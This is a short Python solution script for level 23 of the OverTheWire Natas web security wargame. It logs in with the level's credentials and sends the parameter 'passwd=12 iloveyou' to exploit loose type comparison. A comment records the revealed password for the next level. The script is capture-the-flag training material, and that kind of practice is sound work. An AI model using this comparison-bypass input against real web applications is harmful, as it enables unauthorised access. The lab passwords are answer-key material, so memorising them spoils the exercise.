import requests

url = 'http://natas23.natas.labs.overthewire.org/'
username = 'natas23'
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
session = requests.session()

response = session.get(
    url, params = {"passwd": "12 iloveyou"}, auth=(username, password))

print(response.text)

# natas24_pass: OsRmXFguozKpTZZ5X14zNO43379LZveg